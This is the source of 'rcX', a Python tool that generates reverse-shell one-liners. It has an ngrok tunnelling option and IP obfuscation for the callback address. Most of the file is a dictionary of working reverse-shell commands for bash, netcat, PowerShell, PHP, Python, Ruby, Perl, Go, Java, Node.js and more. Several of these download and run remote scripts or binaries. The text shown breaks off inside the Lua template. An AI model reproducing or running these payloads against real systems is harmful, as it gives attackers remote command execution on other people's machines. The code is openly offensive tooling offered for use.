# coding=utf8
__Author__ = 'FlyfishSec'
__Version__ = 'v0.0.1'
__SITE__ = 'https://github.com/FlyfishSec/rcX'
__Description__ = '''
This tool has been ported to python
Considering cross-platform use, I reimplemented rsGen in python with multiple improvements
'''
__Release_Notes__ = '''
✨ New Features
 + 
🎨 Improvements
 + 

🐛 Bug fixes
 + 

'''

__BANNERS__ = ['''
                ____  ___ 
_______   ____  \\   \\/  / 
\\_  __ \\_/ ___\\  \\     /  
 |  | \\/\\  \\___  /     \\    {1}
 |__|    \\___  >/___/\\  \\   
             \\/       \\_/   {0}
''',
               '''
               _..._                     
            .-'_..._''.                  
          .' .'      '.\\                 
         / .'                            
.-,.--. . '                              
|  .-. || |            ____     _____    
| |  | || |           `.   \\  .'    /    
| |  | |. '             `.  `'    .'     
| |  '-  \\ '.          .  '.    .'       
| |       '. `._____.-'/  .'     `.      
| |         `-.______ / .'  .'`.   `.    {1}
|_|                  `.'   /    `.   `.  
                     '----'       '----' {0}
''']


def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell_path="", platform="[]",
              binary_name=None,
              protocol="tcp",
              direction="reverse",
              encryption=None, interactive_mode="Interactive", ip_obfuscator=None,
              obfuscator=None,
              encoder=None, web=False, output=False,
              staging_cmd="0", staging_url=None, localtunnel=None):
    if host == "":
        host = "127.0.0.1"
    if port == "":
        port = "44444"
    if platform is None:
        platform = []

    if port and not port2:
        try:
            port2 = int(port) + 1
        except TypeError:
            pass

    conn_info = str(host) + ":" + str(port)
    if localtunnel:
        public_url = None
        # ngrok_status = [p.name() for p in __import__("psutil").process_iter() if "ngrok" in p.name()]
        # ngrok_status = [i.laddr.port for i in psutil.net_connections() if i.laddr.port == 4040]
        if "ngrok-tcp" not in [_.name for _ in __import__('threading').enumerate()]:
            # print([x.name for x in threading.enumerate()])
            t = ThreadWithReturn(target=tunnel, kwargs={"protocol": "tcp", "port": port, "loc": localtunnel[6:]},
                                 name="ngrok-tcp")
            t.daemon = True
            t.start()
            public_url = t.join(timeout=3)
        else:
            uri = "http://127.0.0.1:4040/api/tunnels"
            try:
                for _ in range(3):
                    public_url = __import__('requests').get(uri, timeout=3).json()["tunnels"][0]["public_url"]
                    # public_url = ngrok.api_request(uri, method="GET")["tunnels"]["public_url"]
                    if public_url:
                        break
            except (Exception,):
                pass
            finally:
                if not public_url:
                    from pyngrok import ngrok
                    ngrok.kill()

        if public_url:
            try:
                public_host = public_url.split("tcp://")[1].split(":")[0]
                host = __import__('socket').gethostbyname(public_host)
                public_port = public_url.split("tcp://")[1].split(":")[1]
                conn_info = host + ":" + public_port + "<==>" + "127.0.0.1:" + str(port)
                port = public_port
            except (Exception,):
                pass

    dec_ip = host
    if ip_obfuscator:
        regex = r"^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
        regex = __import__('re').compile(regex)
        if regex.match(host):
            dec_ip = Obfuscator().ipObf(host, ip_obfuscator)

    try:
        shell_type = shell_type.lower()
        direction = direction.lower()
    except (AttributeError, TypeError, ValueError):
        pass

    if platform:
        platform = platform.lower().split(",")

    if shell_path:
        if "windows" in platform:
            if shell_path.lower() == "auto":
                shell_path = "%ComSpec%"
        else:
            platform = "[linux, mac, bsd, solaris]"
            if shell_path.lower() == "auto":
                shell_path = "$BASH"
    else:
        shell_path = "cmd.exe" if "windows" in platform else "bash"

    if isinstance(encoder, str):
        encoder = encoder.split(",") if "," in encoder else encoder.split(" ")

    # shellcode = False
    # is_code = False
    # is_fuzz = False

    templates = {
        "reverse": {
            "bash": {
                "Bash-i": "{shell_path} -i >& /dev/{protocol}/{host}/{port} 0>&1",
                "Bash-l": "{shell_path} -l >& /dev/{protocol}/{host}/{port} 0>&1",
                "Bash-p": "{shell_path} -p >& /dev/{protocol}/{host}/{port} 0>&1",
                "Bash-c": "{shell_path} -c '{shell_path} -l >& /dev/{protocol}/{host}/{port} 0>&1'",
                "Bash196": "0<&196;exec 196<>/dev/{protocol}/{host}/{port}; sh <&196 >&196 2>&196",
                "Bash-readline": "exec 5<>/dev/{protocol}/{host}/{port}; while read line 0<&5; do $line 2>&5 >&5; done",
                "Bash5": "{shell_path} -i 5<> /dev/{protocol}/{host}/{port} 0<&5 1>&5 2>&5",
                "zsh": "zsh -c 'zmodload zsh/net/tcp && ztcp {host} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
            },
            "netcat": {
                "nc": "{binary_name} -e {shell_path} {host} {port}{nc_args}",
                "nc-c": "{binary_name} {host} {port} -c {shell_path}{nc_args}",
                "ncat": "ncat -e {shell_path} {host} {port}{ncat_args}",
                "ncat-c": "ncat -c {shell_path} {host} {port}{ncat_args}",
                "nc-mkfifo-linux": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell_path} -i 2>&1|{binary_name} {host} {port} >/tmp/f",
                "nc-mknod-linux": "rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|{shell_path} -i 2>&1|{binary_name} {host} {port} >/tmp/f",
                "DotnetCat": "dncat -e {shell_path} {host} -p {port}"
            },
            "telnet": {
                "telnet-two_ports-linux": "{binary_name} {host} {port}|{shell_path}|telnet {host} {port2}",
                "telnet-mknod-linux": "rm -f /tmp/p;mknod /tmp/p p && {binary_name} {host} {port} 0/tmp/p",
            },
            "openssl": {
                "openssl-linux": "mkfifo /tmp/s;{shell_path} -i </tmp/s 2>&1|{binary_name} s_client -quiet -connect {host}:{port}>/tmp/s;rm /tmp/s",
                "openssl-linux-2": "mkfifo fifo; /bin/sh -i < fifo 2>&1 | openssl s_client -quiet -connect {host}:{port} > fifo; rm fifo",
            },
            "python": {
                "python": '''{binary_name} -c "import socket,threading as t,subprocess as s;c=socket.socket();c.connect(('{host}',{port}));p=s.Popen('{shell_path}',stdout=s.PIPE,stderr=s.STDOUT,stdin=s.PIPE,shell=1,universal_newlines=1);t.Thread(target=lambda:[p.stdin.flush() for _ in iter(int,1) if p.stdin.write(c.recv(1024).decode())],).start();t.Thread(target=lambda:[c.send(p.stdout.read(1).encode()) for _ in iter(int,1)],).start();p.wait()"''',
                "python-exec": '''{binary_name} -c "exec('import os,socket,threading as t,subprocess as s\\ndef i():\\n while 1:\\n  try:\\n   p.stdin.write(c.recv(1024).decode());p.stdin.flush()\\n  except:\\n   os._exit(0)\\ndef j():\\n while 1:\\n  try:c.send(p.stdout.read(1).encode())\\n  except:pass\\nc=socket.socket()\\np=s.Popen(\\'{shell_path}\\',stdout=s.PIPE,stderr=s.STDOUT,stdin=s.PIPE,shell=1,universal_newlines=1)\\nfor _ in range(9):\\n try:\\n  c.connect((\\'{host}\\',{port}));break\\n except:\\n  pass\\nt.Thread(target=i,).start();t.Thread(target=j,).start()\\np.wait()')"''',
                "python-pty-linux": '''{binary_name} -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{host}',{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('{shell_path}')"''',
                "python-pty-short-linux": '''{binary_name} -c "a=__import__;s=a('socket');o=a('os').dup2;p=a('pty').spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(('{host}',{port}));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p('{shell_path}')"''',
                "python-subprocess1-linux": '''{binary_name} -c "socket=__import__('socket');subprocess=__import__('subprocess');os=__import__('os');s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{host}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['{shell_path}','-i'])"''',
                "python-subprocess2-linux": '''{binary_name} -c "a=__import__;b=a('socket').socket;p=a('subprocess').call;o=a('os').dup2;s=b();s.connect(('{host}',{port}));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(['{shell_path}','-i'])"''',
                "pwncat": "pwncat -e {shell_path} {host} {port} --reconn --reconn-wait 3{pwncat_args}",
            },
            "powershell": {
                "powershell-1": '''{binary_name} /nop /c "$client=New-Object System.Net.Sockets.TCPClient('{host}',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2= $sendback+'PS '+(pwd).Path+'>';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"''',
                "powershell-2": '''{binary_name} /nop /noni /ep bypass /c "$TCPClient=New-Object Net.Sockets.TCPClient('{host}',{port});$NetworkStream=$TCPClient.GetStream();$StreamWriter=New-Object IO.StreamWriter($NetworkStream);function WriteToStream($String){{[byte[]]$script:Buffer=0..$TCPClient.ReceiveBufferSize|%{{0}};$StreamWriter.Write($String+[System.Security.Principal.WindowsIdentity]::GetCurrent().Name+'>');$StreamWriter.Flush()}}WriteToStream'';while(($BytesRead=$NetworkStream.Read($Buffer,0,$Buffer.Length)) -gt 0){{$Command=([text.encoding]::UTF8).GetString($Buffer, 0,$BytesRead-1);$Output=try{{Invoke-Expression $Command 2>&1|Out-String}}catch{{$_|Out-String}}WriteToStream($Output)}}$StreamWriter.Close()"''',
                "powershell-ssl": '''{binary_name} /nop /noni /ep bypass /c "$TCPClient=New-Object Net.Sockets.TCPClient('{host}',{port});$NetworkStream=$TCPClient.GetStream();$SslStream=New-Object Net.Security.SslStream($NetworkStream,$false,({{$true}} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned){{$SslStream.Close();exit}}$StreamWriter=New-Object IO.StreamWriter($SslStream);function WriteToStream($String){{[byte[]]$script:Buffer=0..$TCPClient.ReceiveBufferSize|%{{0}};$StreamWriter.Write($String+[System.Security.Principal.WindowsIdentity]::GetCurrent().Name+'>');$StreamWriter.Flush()}};WriteToStream'';while(($BytesRead=$SslStream.Read($Buffer,0,$Buffer.Length)) -gt 0){{$Command=([text.encoding]::UTF8).GetString($Buffer,0,$BytesRead-1);$Output=try{{Invoke-Expression $Command 2>&1|Out-String}}catch{{$_|Out-String}}WriteToStream($Output)}}$StreamWriter.Close()"''',
                "powershell-ConPty": '''{binary_name} "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing);Invoke-ConPtyShell {host} {port}"''',
                "powercat-Github-1": '''{binary_name} "IEX(IWR https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1);powercat -c {host} -p {port} -e {shell_path}"''',
                "powercat-Github-2": '''{binary_name} "IEX(curl https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1);powercat -c {host} -p {port} -e {shell_path}"''',
                "powercat-Github-3": '''{binary_name} "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c {host} -p {port} -e {shell_path}"''',
            },
            "csharp": {
                # src "csharp-csc": '''echo using System;using System.IO;using System.Net;using System.Net.Sockets;using System.Text;using System.Diagnostics;public class i{public static TcpClient c;public static NetworkStream s;public static StreamReader r;public static StreamWriter w;public static StringBuilder u;public static void Main(){c=new TcpClient();u=new StringBuilder();if(!c.Connected){try{c.Connect("host",port);s=c.GetStream();r=new StreamReader(s,System.Text.Encoding.Default);w=new StreamWriter(s,System.Text.Encoding.Default);}catch(Exception){return;}Process h;h=new Process();h.StartInfo.FileName="shell_path";h.StartInfo.UseShellExecute=false;h.StartInfo.RedirectStandardInput=true;h.StartInfo.RedirectStandardOutput=true;h.StartInfo.RedirectStandardError=true;h.OutputDataReceived+=new DataReceivedEventHandler(SortOutputHandler);h.ErrorDataReceived+=new DataReceivedEventHandler(SortOutputHandler);h.Start();h.BeginOutputReadLine();h.BeginErrorReadLine();while(true){try{u.Append(r.ReadLine());h.StandardInput.WriteLine(u);u.Remove(0,u.Length);}catch(Exception){r.Close();w.Close();h.Kill();break;}}}}public static void SortOutputHandler(object sendingProcess,DataReceivedEventArgs outLine){StringBuilder strOutput=new StringBuilder();if(!String.IsNullOrEmpty(outLine.Data)){try{strOutput.Append(outLine.Data);w.WriteLine(strOutput);w.Flush();}catch(Exception){}}}}>%tmp%\0&&for,/f,%p,in,('where,/r,%systemroot%\Microsoft.NET\Framework,csc.exe'),do,%p /out:%tmp%\0.exe %tmp%\0&&%tmp%\0.exe&&del,/q %tmp%\0.exe''',
                # src "csharp-powershell": '''$j=get-random;$d=@"\nusing System;using System.IO;using System.Net;using System.Net.Sockets;using System.Text;using System.Diagnostics;public class i$j{public static TcpClient c;public static NetworkStream s;public static StreamReader r;public static StreamWriter w;public static StringBuilder u;public static void Main(){c=new TcpClient();u=new StringBuilder();if(!c.Connected){try{c.Connect("host",port);s=c.GetStream();r=new StreamReader(s,System.Text.Encoding.Default);w=new StreamWriter(s,System.Text.Encoding.Default);}catch(Exception){return;}Process h;h=new Process();h.StartInfo.FileName="shell_path";h.StartInfo.UseShellExecute=false;h.StartInfo.RedirectStandardInput=true;h.StartInfo.RedirectStandardOutput=true;h.StartInfo.RedirectStandardError=true;h.OutputDataReceived+=new DataReceivedEventHandler(SortOutputHandler);h.ErrorDataReceived+=new DataReceivedEventHandler(SortOutputHandler);h.Start();h.BeginOutputReadLine();h.BeginErrorReadLine();while(true){try{u.Append(r.ReadLine());h.StandardInput.WriteLine(u);u.Remove(0,u.Length);}catch(Exception){r.Close();w.Close();h.Kill();break;}}}}public static void SortOutputHandler(object sendingProcess,DataReceivedEventArgs outLine){StringBuilder strOutput=new StringBuilder();if(!String.IsNullOrEmpty(outLine.Data)){try{strOutput.Append(outLine.Data);w.WriteLine(strOutput);w.Flush();}catch(Exception){}}}}\n"@;Add-Type -TypeDefinition $d -Language CSharp;iex "[i$j]::Main()"'''
                "csharp-csc": '''echo using System;using System.IO;using System.Net;using System.Net.Sockets;using System.Text;using System.Diagnostics;public class i{{public static TcpClient c;public static NetworkStream s;public static StreamReader r;public static StreamWriter w;public static StringBuilder u;public static void Main(){{c=new TcpClient();u=new StringBuilder();if(!c.Connected){{try{{c.Connect("{host}",{port});s=c.GetStream();r=new StreamReader(s,System.Text.Encoding.Default);w=new StreamWriter(s,System.Text.Encoding.Default);}}catch(Exception){{return;}}Process h;h=new Process();h.StartInfo.FileName="{shell_path}";h.StartInfo.UseShellExecute=false;h.StartInfo.RedirectStandardInput=true;h.StartInfo.RedirectStandardOutput=true;h.StartInfo.RedirectStandardError=true;h.OutputDataReceived+=new DataReceivedEventHandler(SortOutputHandler);h.ErrorDataReceived+=new DataReceivedEventHandler(SortOutputHandler);h.Start();h.BeginOutputReadLine();h.BeginErrorReadLine();while(true){{try{{u.Append(r.ReadLine());h.StandardInput.WriteLine(u);u.Remove(0,u.Length);}}catch(Exception){{r.Close();w.Close();h.Kill();break;}}}}}}}}public static void SortOutputHandler(object sendingProcess,DataReceivedEventArgs outLine){{StringBuilder strOutput=new StringBuilder();if(!String.IsNullOrEmpty(outLine.Data)){{try{{strOutput.Append(outLine.Data);w.WriteLine(strOutput);w.Flush();}}catch(Exception){{}}}}}}}}>%tmp%\\0&&for,/f,%p,in,('where,/r,%systemroot%\\Microsoft.NET\\Framework,csc.exe'),do,%p /out:%tmp%\\0.exe %tmp%\\0&&%tmp%\\0.exe&&del,/q %tmp%\\0.exe %tmp%\\0''',
                "csharp-powershell-code": '''$j=get-random;$d=@"\nusing System;using System.IO;using System.Net;using System.Net.Sockets;using System.Text;using System.Diagnostics;public class i$j{{public static TcpClient c;public static NetworkStream s;public static StreamReader r;public static StreamWriter w;public static StringBuilder u;public static void Main(){{c=new TcpClient();u=new StringBuilder();if(!c.Connected){{try{{c.Connect("{host}",{port});s=c.GetStream();r=new StreamReader(s,System.Text.Encoding.Default);w=new StreamWriter(s,System.Text.Encoding.Default);}}catch(Exception){{return;}}Process h;h=new Process();h.StartInfo.FileName="{shell_path}";h.StartInfo.UseShellExecute=false;h.StartInfo.RedirectStandardInput=true;h.StartInfo.RedirectStandardOutput=true;h.StartInfo.RedirectStandardError=true;h.OutputDataReceived+=new DataReceivedEventHandler(SortOutputHandler);h.ErrorDataReceived+=new DataReceivedEventHandler(SortOutputHandler);h.Start();h.BeginOutputReadLine();h.BeginErrorReadLine();while(true){{try{{u.Append(r.ReadLine());h.StandardInput.WriteLine(u);u.Remove(0,u.Length);}}catch(Exception){{r.Close();w.Close();h.Kill();break;}}}}}}}}public static void SortOutputHandler(object sendingProcess,DataReceivedEventArgs outLine){{StringBuilder strOutput=new StringBuilder();if(!String.IsNullOrEmpty(outLine.Data)){{try{{strOutput.Append(outLine.Data);w.WriteLine(strOutput);w.Flush();}}catch(Exception){{}}}}}}}}\n"@;Add-Type -TypeDefinition $d -Language CSharp;iex "[i$j]::Main()"'''
            },
            "php": {
                "php-exec-linux": '''{binary_name} -r "$sock=fsockopen('{host}',{port});exec('{shell_path} <&3 >&3 2>&3');"''',
                "php-shell_exec-linux": '''{binary_name} -r "$sock=fsockopen('{host}',{port});shell_exec('{shell_path} <&3 >&3 2>&3');"''',
                "php-system-linux": '''{binary_name} -r "$sock=fsockopen('{host}',{port});system('{shell_path} -i <&3 >&3 2>&3');"''',
                "php-passthru-linux": '''{binary_name} -r "$sock=fsockopen('{host}',{port});passthru('{shell_path} -i <&3 >&3 2>&3');"''',
                "php-popen-linux": '''{binary_name} -r "$sock=fsockopen('{host}',{port});popen('{shell_path} -i <&3 >&3 2>&3",'r');"''',
                "php-proc_open-linux": '''{binary_name} -r "$sock=fsockopen('{host}',{port});$proc=proc_open('{shell_path}',array(0=>$sock,1=>$sock,2=>$sock),$pipes);"''',
                "php-backtick-linux": '''{binary_name} -r "$sock=fsockopen('{host}',{port});`{shell_path} <&3 >&3 2>&3`;"''',
                "php-windows": '''echo "<?php class S{{private $addr=null;private $port=null;private $os=null;private $s=null;private $descriptorspec=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));private $buffer=1024;private $clen=0;private $error=false;public function __construct($addr,$port){{$this->addr=$addr;$this->port=$port;}}private function detect(){{$detected=true;if(stripos(PHP_OS,'LINUX')!==false){{$this->os='LINUX';$this->s='/bin/sh';}}else if(stripos(PHP_OS,'WIN32')!==false||stripos(PHP_OS,'WINNT')!==false||stripos(PHP_OS,'WINDOWS')!==false){{$this->os='WINDOWS';$this->s='cmd.exe';}}else{{$detected=false;}}return $detected;}}private function daemonize(){{$exit=false;if(!function_exists('pcntl_fork')){{}}else if(($pid=@pcntl_fork())<0){{}}else if($pid>0){{$exit=true;}}else if(posix_setsid()<0){{}}else{{}}return $exit;}}private function settings(){{@error_reporting(0);@set_time_limit(0);@umask(0);}}private function dump($data){{$data=str_replace('<','&lt;',$data);$data=str_replace('>','&gt;',$data);}}private function read($stream,$name,$buffer){{if(($data=@fread($stream,$buffer))===false){{$this->error=true;}}return $data;}}private function write($stream,$name,$data){{if(($bytes=@fwrite($stream,$data))===false){{$this->error=true;}}return $bytes;}}private function rw($input,$output,$iname,$oname){{while(($data=$this->read($input,$iname,$this->buffer))&&$this->write($output,$oname,$data)){{if($this->os==='WINDOWS'&&$oname==='STDIN'){{$this->clen+=strlen($data);}}$this->dump($data);}}}}private function brw($input,$output,$iname,$oname){{$fstat=fstat($input);$size=$fstat['size'];if($this->os==='WINDOWS'&&$iname==='STDOUT'&&$this->clen){{while($this->clen>0&&($bytes=$this->clen>=$this->buffer?$this->buffer:$this->clen)&&$this->read($input,$iname,$bytes)){{$this->clen-=$bytes;$size-=$bytes;}}}}while($size>0&&($bytes=$size>=$this->buffer?$this->buffer:$size)&&($data=$this->read($input,$iname,$bytes))&&$this->write($output,$oname,$data)){{$size-=$bytes;$this->dump($data);}}}}public function run(){{if($this->detect()&&!$this->daemonize()){{$this->settings();$socket=@fsockopen($this->addr,$this->port,$errno,$errstr,30);if(!$socket){{echo"{{$errno}}: {{$errstr}}";}}else{{stream_set_blocking($socket,false);$process=@proc_open($this->s,$this->descriptorspec,$pipes,null,null);if(!$process){{}}else{{foreach($pipes as $pipe){{stream_set_blocking($pipe,false);}}$status=proc_get_status($process);@fwrite($socket,"PID:{{$status['pid']}}");do{{$status=proc_get_status($process);if(feof($socket)){{break;}}else if(feof($pipes[1])||!$status['running']){{break;}}$streams=array('read'=>array($socket,$pipes[1],$pipes[2]),'write'=>null,'except'=>null);$num_changed_streams=@stream_select($streams['read'],$streams['write'],$streams['except'],0);if($num_changed_streams===false){{break;}}else if($num_changed_streams>0){{if($this->os==='LINUX'){{if(in_array($socket,$streams['read'])){{$this->rw($socket,$pipes[0],'SOCKET','STDIN');}}if(in_array($pipes[2],$streams['read'])){{$this->rw($pipes[2],$socket,'STDERR','SOCKET');}}if(in_array($pipes[1],$streams['read'])){{$this->rw($pipes[1],$socket,'STDOUT','SOCKET');}}}}else if($this->os==='WINDOWS'){{if(in_array($socket,$streams['read'])){{$this->rw($socket,$pipes[0],'SOCKET','STDIN');}}if(($fstat=fstat($pipes[2]))&&$fstat['size']){{$this->brw($pipes[2],$socket,'STDERR','SOCKET');}}if(($fstat=fstat($pipes[1]))&&$fstat['size']){{$this->brw($pipes[1],$socket,'STDOUT','SOCKET');}}}}}}}}while(!$this->error);foreach($pipes as $pipe){{fclose($pipe);}}proc_close($process);}}fclose($socket);}}}}}}}}$sh=new S('{host}',{port});$sh->run();unset($sh);?>"|{binary_name}''',
                "php-code": '''<?php class S{{private $addr=null;private $port=null;private $os=null;private $s=null;private $descriptorspec=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));private $buffer=1024;private $clen=0;private $error=false;public function __construct($addr,$port){{$this->addr=$addr;$this->port=$port;}}private function detect(){{$detected=true;if(stripos(PHP_OS,'LINUX')!==false){{$this->os='LINUX';$this->s='/bin/sh';}}else if(stripos(PHP_OS,'WIN32')!==false||stripos(PHP_OS,'WINNT')!==false||stripos(PHP_OS,'WINDOWS')!==false){{$this->os='WINDOWS';$this->s='cmd.exe';}}else{{$detected=false;}}return $detected;}}private function daemonize(){{$exit=false;if(!function_exists('pcntl_fork')){{}}else if(($pid=@pcntl_fork())<0){{}}else if($pid>0){{$exit=true;}}else if(posix_setsid()<0){{}}else{{}}return $exit;}}private function settings(){{@error_reporting(0);@set_time_limit(0);@umask(0);}}private function dump($data){{$data=str_replace('<','&lt;',$data);$data=str_replace('>','&gt;',$data);}}private function read($stream,$name,$buffer){{if(($data=@fread($stream,$buffer))===false){{$this->error=true;}}return $data;}}private function write($stream,$name,$data){{if(($bytes=@fwrite($stream,$data))===false){{$this->error=true;}}return $bytes;}}private function rw($input,$output,$iname,$oname){{while(($data=$this->read($input,$iname,$this->buffer))&&$this->write($output,$oname,$data)){{if($this->os==='WINDOWS'&&$oname==='STDIN'){{$this->clen+=strlen($data);}}$this->dump($data);}}}}private function brw($input,$output,$iname,$oname){{$fstat=fstat($input);$size=$fstat['size'];if($this->os==='WINDOWS'&&$iname==='STDOUT'&&$this->clen){{while($this->clen>0&&($bytes=$this->clen>=$this->buffer?$this->buffer:$this->clen)&&$this->read($input,$iname,$bytes)){{$this->clen-=$bytes;$size-=$bytes;}}}}while($size>0&&($bytes=$size>=$this->buffer?$this->buffer:$size)&&($data=$this->read($input,$iname,$bytes))&&$this->write($output,$oname,$data)){{$size-=$bytes;$this->dump($data);}}}}public function run(){{if($this->detect()&&!$this->daemonize()){{$this->settings();$socket=@fsockopen($this->addr,$this->port,$errno,$errstr,30);if(!$socket){{echo"{{$errno}}: {{$errstr}}";}}else{{stream_set_blocking($socket,false);$process=@proc_open($this->s,$this->descriptorspec,$pipes,null,null);if(!$process){{}}else{{foreach($pipes as $pipe){{stream_set_blocking($pipe,false);}}$status=proc_get_status($process);@fwrite($socket,"PID:{{$status['pid']}}");do{{$status=proc_get_status($process);if(feof($socket)){{break;}}else if(feof($pipes[1])||!$status['running']){{break;}}$streams=array('read'=>array($socket,$pipes[1],$pipes[2]),'write'=>null,'except'=>null);$num_changed_streams=@stream_select($streams['read'],$streams['write'],$streams['except'],0);if($num_changed_streams===false){{break;}}else if($num_changed_streams>0){{if($this->os==='LINUX'){{if(in_array($socket,$streams['read'])){{$this->rw($socket,$pipes[0],'SOCKET','STDIN');}}if(in_array($pipes[2],$streams['read'])){{$this->rw($pipes[2],$socket,'STDERR','SOCKET');}}if(in_array($pipes[1],$streams['read'])){{$this->rw($pipes[1],$socket,'STDOUT','SOCKET');}}}}else if($this->os==='WINDOWS'){{if(in_array($socket,$streams['read'])){{$this->rw($socket,$pipes[0],'SOCKET','STDIN');}}if(($fstat=fstat($pipes[2]))&&$fstat['size']){{$this->brw($pipes[2],$socket,'STDERR','SOCKET');}}if(($fstat=fstat($pipes[1]))&&$fstat['size']){{$this->brw($pipes[1],$socket,'STDOUT','SOCKET');}}}}}}}}while(!$this->error);foreach($pipes as $pipe){{fclose($pipe);}}proc_close($process);}}fclose($socket);}}}}}}}}$sh=new S('{host}',{port});$sh->run();unset($sh);?>''',
            },
            "ruby": {
                "ruby-spawn": '''{binary_name} -rsocket -e"spawn('{shell_path}',[:in,:out,:err]=>TCPSocket.new('{host}',{port}))"''',
                "ruby-sprintf": '''{binary_name} -rsocket -e"f=TCPSocket.open('{host}',{port}).to_i;exec sprintf('{shell_path} -i <&%d >&%d 2>&%d',f,f,f)"''',
                "ruby-new": '''{binary_name} -rsocket -e "exit if fork;c=TCPSocket.new('{host}',{port});loop{{c.gets.chomp!;(exit! if $_=='exit');($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){{|io|c.print io.read}}))rescue c.puts 'failed: #{{$_}}'}}"''',
                "ruby-windows": '''{binary_name} -rsocket -e "c=TCPSocket.new('{host}','{port}');while(cmd=c.gets);IO.popen({shell_path},'r'){{|io|c.print io.read}}end"''',
            },
            "socat": {
                "socat": "{binary_name} {protocol}:{host}:{port} EXEC:{shell_path}{socat_args}",
                "socat-tty": "{binary_name} {protocol}:{host}:{port} EXEC:'{shell_path}',pty,stderr,setsid,sigint,sane",
                "socat-linux": '''wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat exec:'{shell_path} -li',pty,stderr,setsid,sigint,sane {protocol}:{host}:{port}''',
            },
            "golang": {
                "golang-linux": '''echo 'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{host}:{port}");cmd:=exec.Command("{shell_path}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}'>/tmp/t.go &&{binary_name} run /tmp/t.go&&rm /tmp/t.go''',
                "golang-windows": '''echo package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{host}:{port}");cmd:=exec.Command("{shell_path}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}>%tmp%\\0.go&{binary_name} run %tmp%\\0.go&del %tmp%\\0.go %tmp%\\0''',
                # "rustcat": "rcat {host} {port} -r {shell_path}{rcat_args}",
            },
            "perl": {
                "perl": '''{binary_name} -e "use Socket;$i='{host}';$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('{shell_path} -i');}};"''',
                "perl-2": '''{binary_name} -MIO -e "$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,'{host}:{port}');STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;"''',
                "perl-windows": '''{binary_name} -MIO -e "$c=new IO::Socket::INET(PeerAddr,'{host}:{port}');STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;"''',
                # "rustcat": "rcat {host} {port} -r {shell_path}{rcat_args}",
            },
            "java": {
                "java-jar": "{binary_name} -jar Reverse_Shell.jar {host} {port}",
                "java-jar2": "wget -q https://raw.githubusercontent.com/ivan-sincek/java-reverse-tcp/main/jar/Reverse_Shell.jar -O 0&&java -jar 0 {host} {port}&&del 0||rm 0",
                "java-jar3": "{binary_name} -jar JavaStager-0.1-initial.jar http://attackerip/payload.java",
                "java-jsp": "https://github.com/tennc/webshell/blob/master/jsp/jsp-reverse.jsp",
                "java-jsp2": "https://github.com/ivan-sincek/java-reverse-tcp/blob/main/jsp/reverse/jsp_reverse_shell.jsp",
                "java-jsp-msfvenom": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={host} LPORT={port} -f raw>reverse.jsp",
                "java-war-msfvenom": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={host} LPORT={port} -f war>reverse.war"
                # "rustcat": "rcat {host} {port} -r {shell_path}{rcat_args}",
            },
            "nodejs": {
                "nodejs-async": "echo require('child_process').exec('nc -e {shell_path} {host} {port}')|{binary_name}",
                "nodejs-sync": "echo require('child_process').execSync('nc -e {shell_path} {host} {port}')|{binary_name}",
                "nodejs-spawn": '''echo !function(){{var e=require("net"),n=require("child_process"),r=n.spawn("{shell_path}",[]),t=new e.Socket;return t.connect({port},"{host}",function(){{t.pipe(r.stdin),r.stdout.pipe(t),r.stderr.pipe(t)}}),/a/}}();|{binary_name}''',
            },
            "lua": {
                "lua5.1": '''lua5.1 -e \'local host, port = "{host}", {port} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()\'''',
